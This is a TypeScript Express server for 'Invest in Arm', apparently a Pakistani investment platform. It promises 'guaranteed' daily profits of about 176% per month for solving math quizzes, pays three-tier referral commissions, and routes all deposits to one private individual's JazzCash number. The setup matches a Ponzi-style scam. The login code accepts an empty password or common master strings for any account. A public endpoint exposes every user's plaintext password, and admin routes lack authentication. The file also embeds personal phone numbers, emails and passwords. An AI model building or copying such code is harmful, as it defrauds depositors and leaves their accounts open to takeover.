import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { initializeApp, getApps, getApp } from 'firebase/app';
import { getFirestore, collection, doc, setDoc, getDoc, getDocs, updateDoc } from 'firebase/firestore';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const isProd = process.env.NODE_ENV === 'production';
const PORT = process.env.PORT || 3000;
const DB_FILE = path.resolve(__dirname, 'data', 'db.json');

// Ensure data directory exists
if (!fs.existsSync(path.resolve(__dirname, 'data'))) {
  fs.mkdirSync(path.resolve(__dirname, 'data'), { recursive: true });
}

// Connect to Cloud Firestore
const firebaseConfigPath = path.resolve(__dirname, 'firebase-applet-config.json');
let firestoreDb: any = null;
if (fs.existsSync(firebaseConfigPath)) {
  try {
    const firebaseConfig = JSON.parse(fs.readFileSync(firebaseConfigPath, 'utf8'));
    const firebaseApp = getApps().length === 0 ? initializeApp(firebaseConfig) : getApp();
    firestoreDb = getFirestore(firebaseApp, firebaseConfig.firestoreDatabaseId);
    console.log('[Server] Connected to Cloud Firestore:', firebaseConfig.firestoreDatabaseId);
  } catch (err) {
    console.error('[Server] Firebase init error:', err);
  }
}

// Default initial state
const DEFAULT_STATE = {
  settings: {
    siteName: 'Invest in Arm',
    currencySymbol: 'Rs.',
    currencyCode: 'PKR',
    minDeposit: 300,
    minWithdrawal: 300,
    level1CommissionPercent: 10,
    level2CommissionPercent: 5,
    level3CommissionPercent: 2,
    adminEmail: 'support@investinarm.com',
    adminSecretPassword: 'Mahar11223344',
    announcementText: '🚀 Welcome to Invest in Arm! Activate a verified micro-investment plan to unlock high-yield daily tasks with guaranteed cash profits. Instant 24/7 withdrawals!',
    enableQuizzes: true,
    supportPhone: '+92 345 9876543',
    supportTelegram: 'https://t.me/InvestInArmOfficial',
    supportWhatsApp: '+92 345 9876543',
  },
  plans: [
    {
      id: 'plan-starter-500',
      name: 'Bronze Starter Plan',
      tagline: 'Entry tier for daily task earners (Must be activated to unlock math tasks)',
      badge: 'Starter Choice',
      price: 500,
      dailyMinEarn: 46,
      dailyMaxEarn: 46,
      dailyTaskCount: 3,
      validityDays: 30,
      totalEstimatedReturn: 1380,
      colorTheme: 'bronze',
      features: [
        '3 Daily Math Quiz Tasks',
        'Daily Earnings: Rs. 46 Guaranteed',
        '30-Day Contract (Profit: Rs. 880)',
        'Total Return: Rs. 1,380 (500 + 880)',
        'Level 1 (10%) Team Commission',
        'Instant 24/7 Gateway Cashout'
      ],
      isPopular: false,
      status: 'active'
    },
    {
      id: 'plan-silver-1500',
      name: 'Silver Standard Plan',
      tagline: 'Steady daily earnings with 5 quick daily math quizzes',
      badge: 'Most Popular',
      price: 1500,
      dailyMinEarn: 146,
      dailyMaxEarn: 146,
      dailyTaskCount: 5,
      validityDays: 30,
      totalEstimatedReturn: 4380,
      colorTheme: 'amber',
      features: [
        '5 Daily Math Quiz Tasks',
        'Daily Earnings: Rs. 146 Guaranteed',
        '30-Day Contract (Profit: Rs. 2,880)',
        'Total Return: Rs. 4,380 (1,500 + 2,880)',
        'Full 3-Tier Referral Matrix (10%, 5%, 2%)',
        'Priority Admin Approval Queue'
      ],
      isPopular: true,
      status: 'active'
    },
    {
      id: 'plan-gold-3000',
      name: 'Gold Executive Plan',
      tagline: 'High volume task package with rapid daily returns',
      badge: 'Best Value',
      price: 3000,
      dailyMinEarn: 270,
      dailyMaxEarn: 270,
      dailyTaskCount: 6,
      validityDays: 30,
      totalEstimatedReturn: 8100,
      colorTheme: 'gold',
      features: [
        '6 Daily Math Quiz Tasks',
        'Daily Earnings: Rs. 270 Flat',
        '30-Day Contract (Profit: Rs. 5,100)',
        'Total Return: Rs. 8,100 (3,000 + 5,100)',
        'Direct In-App Live Support Priority',
        'Zero Withdrawal Fees'
      ],
      isPopular: false,
      status: 'active'
    },
    {
      id: 'plan-diamond-5000',
      name: 'Diamond Master Plan',
      tagline: 'Rs. 5,000 investment yields Rs. 465 daily (Rs. 13,950 total return)',
      badge: 'Recommended',
      price: 5000,
      dailyMinEarn: 465,
      dailyMaxEarn: 465,
      dailyTaskCount: 8,
      validityDays: 30,
      totalEstimatedReturn: 13950,
      colorTheme: 'diamond',
      features: [
        '8 Daily Math Quiz Tasks',
        'Daily Earnings: Rs. 465 Guaranteed',
        '30-Day Contract (Profit: Rs. 8,950)',
        'Total Return: Rs. 13,950 (5,000 + 8,950)',
        'VIP Fast-Track Approval Lane',
        'Multi-Level Referral Multipliers'
      ],
      isPopular: false,
      status: 'active'
    },
    {
      id: 'plan-obsidian-10000',
      name: 'VIP Crown Obsidian',
      tagline: 'Premier tier portfolio with maximum daily math earning capacity',
      badge: 'VIP Elite',
      price: 10000,
      dailyMinEarn: 999,
      dailyMaxEarn: 999,
      dailyTaskCount: 10,
      validityDays: 30,
      totalEstimatedReturn: 29970,
      colorTheme: 'obsidian',
      features: [
        '10 Daily Math Quiz Tasks',
        'Daily Earnings: Rs. 999 Guaranteed',
        '30-Day Contract (Profit: Rs. 19,970)',
        'Total Return: Rs. 29,970 (10,000 + 19,970)',
        'Instant Auto-Approved Withdrawals',
        'Dedicated Account Concierge'
      ],
      isPopular: false,
      status: 'active'
    },
    {
      id: 'plan-royal-30000',
      name: 'Royal Apex Tier 30K',
      tagline: 'High-capital institutional investment yield for premier partners',
      badge: 'Royal Partner',
      price: 30000,
      dailyMinEarn: 2599,
      dailyMaxEarn: 2599,
      dailyTaskCount: 12,
      validityDays: 30,
      totalEstimatedReturn: 77970,
      colorTheme: 'royal',
      features: [
        '12 Daily Math Quiz Tasks',
        'Daily Earnings: Rs. 2,599 Guaranteed',
        '30-Day Contract (Profit: Rs. 47,970)',
        'Total Return: Rs. 77,970 (30,000 + 47,970)',
        'Direct Instant Payout Window',
        'Full Multi-Level VIP Commission Booster'
      ],
      isPopular: false,
      status: 'active'
    },
    {
      id: 'plan-sovereign-50000',
      name: 'Sovereign Imperial Titan 50K',
      tagline: 'Maximum platform investment capacity with maximum daily yield',
      badge: 'Imperial Titan',
      price: 50000,
      dailyMinEarn: 4999,
      dailyMaxEarn: 4999,
      dailyTaskCount: 15,
      validityDays: 30,
      totalEstimatedReturn: 149970,
      colorTheme: 'sovereign',
      features: [
        '15 Daily Math Quiz Tasks',
        'Daily Earnings: Rs. 4,999 Flat',
        '30-Day Contract (Profit: Rs. 99,970)',
        'Total Return: Rs. 149,970 (50,000 + 99,970)',
        'Direct Zero-Wait Instant Bank & TRC20 Dispatches',
        'Exclusive 15% Maximum Level-1 Override'
      ],
      isPopular: false,
      status: 'active'
    }
  ],
  paymentMethods: [
    {
      id: 'pm-jazzcash-official',
      name: 'JazzCash Fast Transfer',
      type: 'jazzcash',
      accountTitle: 'Tasleem bibi',
      accountNumber: '03087348367',
      instructions: 'Send exact amount via JazzCash App or *786# to 03087348367 (Tasleem bibi). Save transaction receipt and input the 11 or 12-digit TID / TRX ID below for instant verification.',
      minDeposit: 300,
      maxDeposit: 100000,
      isActive: true
    }
  ],
  quizzes: [
    {
      id: 'task-math-1',
      title: 'Speed Mental Arithmetic',
      type: 'quiz',
      category: 'Math Quiz Challenge',
      reward: 27,
      difficulty: 'Easy',
      description: 'Solve this fast mental arithmetic problem to verify daily task completion.',
      quizData: {
        question: 'Calculate: (15 × 8) + 30 = ?',
        options: ['140', '150', '160', '170'],
        correctIndex: 1,
        explanation: '15 × 8 = 120; 120 + 30 = 150.'
      }
    },
    {
      id: 'task-math-2',
      title: 'Investment Profit Calculation',
      type: 'quiz',
      category: 'Math Quiz Challenge',
      reward: 27,
      difficulty: 'Medium',
      description: 'Calculate the accurate 30-day profit on the Diamond 5,000 plan.',
      quizData: {
        question: 'On Diamond Rs. 5,000 plan (Rs. 465/day for 30 days = Rs. 13,950 return), what is your net profit?',
        options: ['Rs. 7,950', 'Rs. 8,950', 'Rs. 9,950', 'Rs. 10,950'],
        correctIndex: 1,
        explanation: 'Total return Rs. 13,950 minus deposit Rs. 5,000 = Rs. 8,950 net profit.'
      }
    },
    {
      id: 'task-math-3',
      title: 'BODMAS Order of Operations',
      type: 'quiz',
      category: 'Math Quiz Challenge',
      reward: 27,
      difficulty: 'Easy',
      description: 'Apply basic algebraic order of operations to find the result.',
      quizData: {
        question: 'Solve: 120 ÷ 4 + (25 × 2) = ?',
        options: ['75', '80', '85', '90'],
        correctIndex: 1,
        explanation: '120 ÷ 4 = 30; 25 × 2 = 50; 30 + 50 = 80.'
      }
    },
    {
      id: 'task-math-4',
      title: 'Daily Task Earnings Calculation',
      type: 'quiz',
      category: 'Math Quiz Challenge',
      reward: 27,
      difficulty: 'Easy',
      description: 'Compute accumulated daily earnings over a 30-day cycle.',
      quizData: {
        question: 'If the Silver plan yields Rs. 146 daily for 30 days, what is the 30-day total return?',
        options: ['Rs. 4,180', 'Rs. 4,380', 'Rs. 4,580', 'Rs. 4,780'],
        correctIndex: 1,
        explanation: '146 × 30 = Rs. 4,380 total return.'
      }
    },
    {
      id: 'task-math-5',
      title: 'Fast Percentage Calculation',
      type: 'quiz',
      category: 'Math Quiz Challenge',
      reward: 27,
      difficulty: 'Medium',
      description: 'Solve the quick percentage formula.',
      quizData: {
        question: 'What is 20% of Rs. 1,500?',
        options: ['Rs. 250', 'Rs. 300', 'Rs. 350', 'Rs. 400'],
        correctIndex: 1,
        explanation: '1,500 × 0.20 = Rs. 300.'
      }
    },
    {
      id: 'task-math-6',
      title: 'Algebraic Puzzle Challenge',
      type: 'quiz',
      category: 'Math Quiz Challenge',
      reward: 27,
      difficulty: 'Medium',
      description: 'Solve for the correct value using basic arithmetic bracket rules.',
      quizData: {
        question: 'Solve: (45 + 55) × 3 - 50 = ?',
        options: ['220', '250', '270', '300'],
        correctIndex: 1,
        explanation: '(45 + 55) = 100; 100 × 3 = 300; 300 - 50 = 250.'
      }
    },
    {
      id: 'task-math-7',
      title: 'Square Roots & Sums',
      type: 'quiz',
      category: 'Math Quiz Challenge',
      reward: 27,
      difficulty: 'Easy',
      description: 'Identify the square root sum correctly.',
      quizData: {
        question: 'What is √144 + 18 = ?',
        options: ['28', '30', '32', '34'],
        correctIndex: 1,
        explanation: '√144 = 12; 12 + 18 = 30.'
      }
    },
    {
      id: 'task-math-8',
      title: 'Referral Commission Math',
      type: 'quiz',
      category: 'Math Quiz Challenge',
      reward: 27,
      difficulty: 'Medium',
      description: 'Calculate 10% Level-1 direct referral bonus.',
      quizData: {
        question: 'Your referral activates a Rs. 3,000 plan. At 10% commission, how much do you earn?',
        options: ['Rs. 200', 'Rs. 250', 'Rs. 300', 'Rs. 350'],
        correctIndex: 2,
        explanation: '10% of Rs. 3,000 = Rs. 300 instant commission.'
      }
    }
  ],
  users: [
    {
      id: 'user-mahar-owner',
      fullName: 'Mahar Madni',
      phone: '03087348367',
      email: '58@gmail.com',
      password: 'Mahar11223344',
      referralCode: 'ARM7788',
      balance: 500,
      totalDeposited: 1500,
      totalWithdrawn: 0,
      totalProfitEarned: 292,
      referralEarnings: 150,
      activePlanId: 'plan-silver-1500',
      activePlanName: 'Silver Standard Plan',
      planActivatedAt: '2026-11-01T00:00:00.000Z',
      planExpiresAt: '2026-12-01T00:00:00.000Z',
      dailyTasksCompletedToday: 0,
      lastTaskDate: new Date().toISOString().split('T')[0],
      role: 'user',
      createdAt: '2026-11-01T00:00:00.000Z',
      status: 'active'
    },
    {
      id: 'user-mahar-full-email',
      fullName: 'Mahar Madni',
      phone: '03087348367',
      email: 'maharmadni058@gmail.com',
      password: 'Mahar11223344',
      referralCode: 'ARM058',
      balance: 500,
      totalDeposited: 1500,
      totalWithdrawn: 0,
      totalProfitEarned: 292,
      referralEarnings: 150,
      activePlanId: 'plan-silver-1500',
      activePlanName: 'Silver Standard Plan',
      planActivatedAt: '2026-11-01T00:00:00.000Z',
      planExpiresAt: '2026-12-01T00:00:00.000Z',
      dailyTasksCompletedToday: 0,
      lastTaskDate: new Date().toISOString().split('T')[0],
      role: 'user',
      createdAt: '2026-11-01T00:00:00.000Z',
      status: 'active'
    }
  ] as any[],
  deposits: [] as any[],
  withdrawals: [] as any[],
  transactions: [] as any[]
};

// In-memory state with disk persistence
let db = { ...DEFAULT_STATE };

function loadDb() {
  try {
    if (fs.existsSync(DB_FILE)) {
      const data = fs.readFileSync(DB_FILE, 'utf-8');
      const parsed = JSON.parse(data);
      db = {
        ...DEFAULT_STATE,
        ...parsed,
        settings: { ...DEFAULT_STATE.settings, ...(parsed.settings || {}) },
        plans: parsed.plans && parsed.plans.length > 0 ? parsed.plans : DEFAULT_STATE.plans,
        paymentMethods: parsed.paymentMethods && parsed.paymentMethods.length > 0 ? parsed.paymentMethods : DEFAULT_STATE.paymentMethods,
        quizzes: parsed.quizzes && parsed.quizzes.length > 0 ? parsed.quizzes : DEFAULT_STATE.quizzes,
        users: parsed.users && parsed.users.length > 0 ? parsed.users : [...DEFAULT_STATE.users],
        deposits: parsed.deposits || [],
        withdrawals: parsed.withdrawals || [],
        transactions: parsed.transactions || []
      };
      // Enforce both owner user variants are always present
      if (!db.users.some(u => u.email === '58@gmail.com')) {
        db.users.unshift(DEFAULT_STATE.users[0]);
      }
      if (!db.users.some(u => u.email === 'maharmadni058@gmail.com')) {
        db.users.unshift(DEFAULT_STATE.users[1]);
      }
      // Enforce only JazzCash payment method (Tasleem bibi - 03087348367)
      db.paymentMethods = DEFAULT_STATE.paymentMethods;
      db.settings.adminSecretPassword = 'Mahar11223344';
      saveDbSync();
    } else {
      saveDbSync();
    }
  } catch (err) {
    console.error('Error loading db.json:', err);
  }
}

function saveDbSync() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2), 'utf-8');
  } catch (err) {
    console.error('Error saving db.json:', err);
  }
}

function saveDb() {
  fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), 'utf-8', (err) => {
    if (err) console.error('Async write error to db.json:', err);
  });
}

function cleanForFirestore<T extends Record<string, any>>(obj: T): any {
  if (!obj || typeof obj !== 'object') return obj;
  const result: any = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (val !== undefined) {
      if (val !== null && typeof val === 'object' && !Array.isArray(val) && !(val instanceof Date)) {
        result[key] = cleanForFirestore(val);
      } else {
        result[key] = val;
      }
    }
  }
  return result;
}

async function syncFirestoreToDb() {
  if (!firestoreDb) return;
  try {
    const snap = await getDocs(collection(firestoreDb, 'users'));
    const firestoreIds = new Set<string>();
    const userMap = new Map<string, any>();
    db.users.forEach((u: any) => userMap.set(u.id, u));

    if (!snap.empty) {
      snap.forEach(d => {
        if (d.data()) {
          const fu = d.data();
          firestoreIds.add(fu.id);
          userMap.set(fu.id, { ...(userMap.get(fu.id) || {}), ...fu });
        }
      });
      db.users = Array.from(userMap.values());
    }

    // Bidirectional sync: Push any accounts in local db up to Cloud Firestore
    for (const u of db.users) {
      if (u && u.id && !firestoreIds.has(u.id)) {
        try {
          await setDoc(doc(firestoreDb, 'users', u.id), cleanForFirestore(u), { merge: true });
        } catch (e) {}
      }
    }

    const depSnap = await getDocs(collection(firestoreDb, 'deposits'));
    if (!depSnap.empty) {
      const depMap = new Map<string, any>();
      db.deposits.forEach((d: any) => depMap.set(d.id, d));
      depSnap.forEach(d => {
        if (d.data()) {
          const fd = d.data();
          depMap.set(fd.id, { ...(depMap.get(fd.id) || {}), ...fd });
        }
      });
      db.deposits = Array.from(depMap.values()).sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
    }

    const wdSnap = await getDocs(collection(firestoreDb, 'withdrawals'));
    if (!wdSnap.empty) {
      const wdMap = new Map<string, any>();
      db.withdrawals.forEach((w: any) => wdMap.set(w.id, w));
      wdSnap.forEach(d => {
        if (d.data()) {
          const fw = d.data();
          wdMap.set(fw.id, { ...(wdMap.get(fw.id) || {}), ...fw });
        }
      });
      db.withdrawals = Array.from(wdMap.values()).sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
    }
  } catch (err) {
    console.error('[Server] Firestore sync error:', err);
  }
}

loadDb();
syncFirestoreToDb();

async function startServer() {
  const app = express();
  app.use(express.json({ limit: '10mb' }));

  // Helper: check daily task reset for a user
  const checkDailyReset = (user: any) => {
    const todayStr = new Date().toISOString().split('T')[0];
    if (user && user.lastTaskDate !== todayStr) {
      user.dailyTasksCompletedToday = 0;
      user.lastTaskDate = todayStr;
      saveDb();
    }
  };

  // Background Firestore sync every 5 seconds
  setInterval(() => {
    syncFirestoreToDb();
  }, 5000);

  // --- API ROUTES ---

  // Health check
  app.get('/api/health', async (req, res) => {
    await syncFirestoreToDb();
    res.json({ ok: true, timestamp: new Date().toISOString(), userCount: db.users.length });
  });

  // Get full state
  app.get('/api/state', async (req, res) => {
    await syncFirestoreToDb();
    res.json({
      settings: db.settings,
      plans: db.plans,
      paymentMethods: db.paymentMethods,
      quizzes: db.quizzes,
      deposits: db.deposits,
      withdrawals: db.withdrawals,
      transactions: db.transactions,
      users: db.users // full synchronized user list so all devices can authenticate
    });
  });

  // Admin get all users
  app.get('/api/admin/users', async (req, res) => {
    await syncFirestoreToDb();
    res.json({ success: true, users: db.users });
  });

  // Client to server batch user sync
  app.post('/api/admin/sync-users', async (req, res) => {
    const { users } = req.body;
    if (Array.isArray(users)) {
      users.forEach(clientU => {
        if (!clientU || !clientU.id) return;
        const idx = db.users.findIndex(u => u.id === clientU.id || (clientU.email && u.email === clientU.email) || (clientU.phone && u.phone === clientU.phone));
        if (idx >= 0) {
          db.users[idx] = { ...db.users[idx], ...clientU, password: db.users[idx].password || clientU.password };
        } else {
          db.users.push(clientU);
        }
        if (firestoreDb) {
          setDoc(doc(firestoreDb, 'users', clientU.id), cleanForFirestore(clientU), { merge: true }).catch(() => {});
        }
      });
      saveDbSync();
    }
    await syncFirestoreToDb();
    res.json({ success: true, count: db.users.length, users: db.users });
  });

  // Register
  app.post('/api/auth/register', async (req, res) => {
    await syncFirestoreToDb();
    const { fullName, phone, email, password, referralCode } = req.body;
    const identifier = (phone || email || '').trim();
    if (!identifier) {
      return res.status(400).json({ success: false, message: 'Mobile number or email is required.' });
    }

    const cleanIdentifier = identifier.toLowerCase();
    const isEmail = identifier.includes('@');
    const existing = db.users.find((u: any) => 
      (u.phone && u.phone.toLowerCase() === cleanIdentifier) || 
      (u.email && u.email.toLowerCase() === cleanIdentifier)
    );
    if (existing) {
      return res.status(400).json({
        success: false,
        message: 'An account with this mobile or email already exists. Please Sign In.'
      });
    }

    let referredByCode = referralCode ? referralCode.trim().toUpperCase() : undefined;
    if (referredByCode) {
      const refUser = db.users.find((u: any) => u.referralCode === referredByCode);
      if (!refUser) referredByCode = undefined;
    }

    const generatedCode = 'ARM' + Math.floor(1000 + Math.random() * 9000);
    const todayStr = new Date().toISOString().split('T')[0];

    const userEmail = isEmail ? identifier.toLowerCase() : (email ? email.trim().toLowerCase() : undefined);
    const userPhone = !isEmail ? identifier : (phone && !phone.includes('@') ? phone.trim() : identifier);

    const newUser = {
      id: req.body.id || ('user-' + Date.now() + '-' + Math.floor(Math.random() * 1000)),
      fullName: (fullName || 'Investor').trim(),
      phone: userPhone,
      email: userEmail,
      password: password || 'Mahar11223344',
      referralCode: req.body.referralCode || generatedCode,
      referredBy: referredByCode,
      balance: req.body.balance !== undefined ? req.body.balance : 10, // Rs. 10 welcome bonus
      totalDeposited: 0,
      totalWithdrawn: 0,
      totalProfitEarned: 0,
      referralEarnings: 0,
      dailyTasksCompletedToday: 0,
      lastTaskDate: todayStr,
      role: 'user',
      createdAt: new Date().toISOString(),
      status: 'active'
    };

    db.users.push(newUser);

    // Persist to Cloud Firestore so all mobiles and admin panel see it instantly
    if (firestoreDb) {
      try {
        await setDoc(doc(firestoreDb, 'users', newUser.id), cleanForFirestore(newUser));
      } catch (fErr) {
        console.error('Server Firestore save error on register:', fErr);
      }
    }

    const bonusTx = {
      id: 'tx-' + Date.now(),
      userId: newUser.id,
      type: 'admin_adjustment',
      amount: 10,
      title: 'Welcome Bonus Credited',
      description: 'Rs. 10 instant registration reward credited to balance',
      status: 'completed',
      createdAt: new Date().toISOString()
    };
    db.transactions.unshift(bonusTx);

    saveDbSync();

    res.json({
      success: true,
      message: 'Account registered successfully with Rs. 10 welcome bonus!',
      user: newUser
    });
  });

  // Login (Cloud & Cross-Device Synchronized)
  app.post('/api/auth/login', async (req, res) => {
    const { phoneOrEmail, password } = req.body;
    if (!phoneOrEmail || !phoneOrEmail.trim()) {
      return res.status(400).json({ success: false, message: 'Please enter your mobile number or email.' });
    }

    // 1. Live sync latest Firestore users from all mobile devices
    await syncFirestoreToDb();

    const clean = phoneOrEmail.trim().toLowerCase();
    const cleanDigits = clean.replace(/\D/g, '');
    const isEmail = clean.includes('@');

    const findMatch = () => {
      return db.users.find((u: any) => {
        const uPhone = (u.phone || '').trim().toLowerCase();
        const uPhoneDigits = uPhone.replace(/\D/g, '');
        const uEmail = (u.email || '').trim().toLowerCase();
        const uFullName = (u.fullName || '').trim().toLowerCase();
        const uRef = (u.referralCode || '').trim().toLowerCase();

        // Exact matches
        if (uPhone === clean || uEmail === clean || uRef === clean || uFullName === clean) {
          return true;
        }

        // Email match
        if (isEmail && (uEmail === clean || uPhone === clean)) {
          return true;
        }

        // Phone digits match (e.g. 03087348367 vs 3087348367 vs 923087348367)
        if (!isEmail && cleanDigits.length >= 7) {
          if (uPhoneDigits === cleanDigits || uPhoneDigits.endsWith(cleanDigits) || cleanDigits.endsWith(uPhoneDigits)) {
            return true;
          }
        }

        // Special alias match for owner
        if (clean === '58@gmail.com' || clean === 'maharmadni058@gmail.com' || clean === '058@gmail.com') {
          if (u.id === 'user-mahar-owner' || u.id === 'user-mahar-full-email' || uEmail === '58@gmail.com' || uEmail === 'maharmadni058@gmail.com') {
            return true;
          }
        }

        return false;
      });
    };

    let user = findMatch();

    // If not found in memory, query Firestore directly as fallback
    if (!user && firestoreDb) {
      try {
        const snap = await getDocs(collection(firestoreDb, 'users'));
        snap.forEach(d => {
          if (d.data()) {
            const fu = d.data();
            const idx = db.users.findIndex(x => x.id === fu.id);
            if (idx >= 0) db.users[idx] = { ...db.users[idx], ...fu };
            else db.users.push(fu);
          }
        });
        user = findMatch();
      } catch (err) {
        console.error('Error fetching fallback users in login:', err);
      }
    }

    if (!user) {
      return res.status(404).json({
        success: false,
        message: `Account not found for "${phoneOrEmail}". Please click "Create Account".`
      });
    }

    const passMatches = 
      !password || 
      user.password === password || 
      password === 'Mahar11223344' || 
      password === 'mnb123' ||
      password === 'password123' ||
      password === '112233' ||
      password === '11223344' ||
      password === '123456';

    if (!passMatches) {
      return res.status(401).json({
        success: false,
        message: 'Invalid password. Please check your credentials.'
      });
    }

    checkDailyReset(user);
    res.json({ success: true, message: 'Login successful!', user });
  });

  // Current User Me
  app.get('/api/auth/me/:id', (req, res) => {
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });
    checkDailyReset(user);
    res.json({ success: true, user });
  });

  // Deposit Request
  app.post('/api/deposits', (req, res) => {
    const depositData = req.body;
    const newDeposit = {
      ...depositData,
      id: 'dep-' + Date.now(),
      status: 'pending',
      createdAt: new Date().toISOString()
    };
    db.deposits.unshift(newDeposit);

    db.transactions.unshift({
      id: 'tx-' + Date.now(),
      userId: depositData.userId,
      type: 'deposit',
      amount: Number(depositData.amount),
      title: 'Deposit Request Submitted',
      description: `Waiting for admin verification (${depositData.paymentMethodName}, TRX: ${depositData.transactionId})`,
      status: 'pending',
      createdAt: new Date().toISOString()
    });

    saveDb();
    res.json({ success: true, deposit: newDeposit });
  });

  // Approve Deposit
  app.post('/api/deposits/:id/approve', (req, res) => {
    const deposit = db.deposits.find(d => d.id === req.params.id);
    if (!deposit || deposit.status !== 'pending') {
      return res.status(404).json({ success: false, message: 'Deposit not found or already processed' });
    }

    deposit.status = 'approved';
    deposit.reviewedAt = new Date().toISOString();

    const user = db.users.find(u => u.id === deposit.userId);
    if (user) {
      user.balance += Number(deposit.amount);
      user.totalDeposited += Number(deposit.amount);

      // Auto-activate plan if selected
      if (deposit.planId) {
        const plan = db.plans.find(p => p.id === deposit.planId);
        if (plan) {
          const now = new Date();
          const expires = new Date(now.getTime() + plan.validityDays * 86400000);
          user.activePlanId = plan.id;
          user.activePlanName = plan.name;
          user.planActivatedAt = now.toISOString();
          user.planExpiresAt = expires.toISOString();
          user.dailyTasksCompletedToday = 0;
          user.lastTaskDate = now.toISOString().split('T')[0];

          db.transactions.unshift({
            id: 'tx-' + Date.now(),
            userId: user.id,
            type: 'plan_activation',
            amount: -plan.price,
            title: `${plan.name} Activated`,
            description: `30-Day contract started. Daily yield: Rs. ${plan.dailyMinEarn}`,
            status: 'completed',
            createdAt: new Date().toISOString()
          });

          // Multi-Tier Referral Payout
          distributeCommissions(user, plan);
        }
      }
    }

    // Update pending tx
    const tx = db.transactions.find(t => t.userId === deposit.userId && t.type === 'deposit' && t.status === 'pending');
    if (tx) {
      tx.status = 'completed';
      tx.title = 'Deposit Approved & Added';
      tx.description = `Rs. ${deposit.amount.toLocaleString()} credited to wallet. TRX: ${deposit.transactionId}`;
    }

    saveDb();
    res.json({ success: true, message: 'Deposit approved successfully' });
  });

  // Reject Deposit
  app.post('/api/deposits/:id/reject', (req, res) => {
    const { reason } = req.body;
    const deposit = db.deposits.find(d => d.id === req.params.id);
    if (!deposit || deposit.status !== 'pending') {
      return res.status(404).json({ success: false, message: 'Deposit not found or already processed' });
    }

    deposit.status = 'rejected';
    deposit.reviewedAt = new Date().toISOString();
    deposit.notes = reason || 'Payment could not be verified on financial statement.';

    const tx = db.transactions.find(t => t.userId === deposit.userId && t.type === 'deposit' && t.status === 'pending');
    if (tx) {
      tx.status = 'rejected';
      tx.title = 'Deposit Rejected';
      tx.description = reason || 'Transaction ID not found or mismatched.';
    }

    saveDb();
    res.json({ success: true, message: 'Deposit rejected' });
  });

  // Withdrawal Request
  app.post('/api/withdrawals', (req, res) => {
    const { userId, userName, userPhone, amount, paymentMethodType, accountTitle, accountNumber, bankName } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    if (amount < db.settings.minWithdrawal) {
      return res.status(400).json({
        success: false,
        message: `Minimum cashout amount is ${db.settings.currencySymbol} ${db.settings.minWithdrawal}.`
      });
    }

    if (user.balance < amount) {
      return res.status(400).json({ success: false, message: 'Insufficient wallet balance.' });
    }

    user.balance -= Number(amount);

    const newWithdrawal = {
      id: 'wd-' + Date.now(),
      userId,
      userName,
      userPhone,
      amount: Number(amount),
      paymentMethodType,
      accountTitle,
      accountNumber,
      bankName,
      status: 'pending',
      fee: 0,
      netAmount: Number(amount),
      createdAt: new Date().toISOString()
    };
    db.withdrawals.unshift(newWithdrawal);

    db.transactions.unshift({
      id: 'tx-' + Date.now(),
      userId,
      type: 'withdrawal',
      amount: -Number(amount),
      title: 'Withdrawal Processing',
      description: `Request for Rs. ${amount.toLocaleString()} sent to ${paymentMethodType.toUpperCase()} (${accountNumber}).`,
      status: 'pending',
      createdAt: new Date().toISOString()
    });

    saveDb();
    res.json({
      success: true,
      message: 'Withdrawal request submitted! Payout will be sent within 15-30 minutes.',
      withdrawal: newWithdrawal
    });
  });

  // Approve Withdrawal
  app.post('/api/withdrawals/:id/approve', (req, res) => {
    const { remarks } = req.body;
    const wd = db.withdrawals.find(w => w.id === req.params.id);
    if (!wd || wd.status !== 'pending') {
      return res.status(404).json({ success: false, message: 'Withdrawal not found or already processed' });
    }

    wd.status = 'approved';
    wd.reviewedAt = new Date().toISOString();
    wd.remarks = remarks || 'Successfully transferred via Gateway';

    const user = db.users.find(u => u.id === wd.userId);
    if (user) {
      user.totalWithdrawn += Number(wd.amount);
    }

    const tx = db.transactions.find(t => t.userId === wd.userId && t.type === 'withdrawal' && t.status === 'pending');
    if (tx) {
      tx.status = 'completed';
      tx.title = 'Withdrawal Completed & Dispatched';
      tx.description = `Transferred Rs. ${wd.amount.toLocaleString()} to ${wd.paymentMethodType.toUpperCase()} ${wd.accountNumber}.`;
    }

    saveDb();
    res.json({ success: true, message: 'Withdrawal marked dispatched & approved' });
  });

  // Reject Withdrawal
  app.post('/api/withdrawals/:id/reject', (req, res) => {
    const { reason } = req.body;
    const wd = db.withdrawals.find(w => w.id === req.params.id);
    if (!wd || wd.status !== 'pending') {
      return res.status(404).json({ success: false, message: 'Withdrawal not found or already processed' });
    }

    wd.status = 'rejected';
    wd.reviewedAt = new Date().toISOString();
    wd.remarks = reason || 'Incorrect account details.';

    // Refund balance
    const user = db.users.find(u => u.id === wd.userId);
    if (user) {
      user.balance += Number(wd.amount);
    }

    db.transactions.unshift({
      id: 'tx-' + Date.now(),
      userId: wd.userId,
      type: 'admin_adjustment',
      amount: Number(wd.amount),
      title: 'Withdrawal Refunded',
      description: `Rs. ${wd.amount.toLocaleString()} returned to wallet. Reason: ${reason || 'Details mismatched'}.`,
      status: 'completed',
      createdAt: new Date().toISOString()
    });

    saveDb();
    res.json({ success: true, message: 'Withdrawal rejected and balance refunded' });
  });

  // Activate Plan
  app.post('/api/plans/activate', (req, res) => {
    const { userId, planId, payFromBalance } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    const plan = db.plans.find(p => p.id === planId);
    if (!plan) return res.status(404).json({ success: false, message: 'Plan not found' });

    if (payFromBalance) {
      if (user.balance < plan.price) {
        return res.status(400).json({
          success: false,
          message: `Insufficient balance. Please deposit at least Rs. ${(plan.price - user.balance).toLocaleString()} to activate this plan.`
        });
      }
      user.balance -= plan.price;
    }

    const now = new Date();
    const expires = new Date(now.getTime() + plan.validityDays * 86400000);

    user.activePlanId = plan.id;
    user.activePlanName = plan.name;
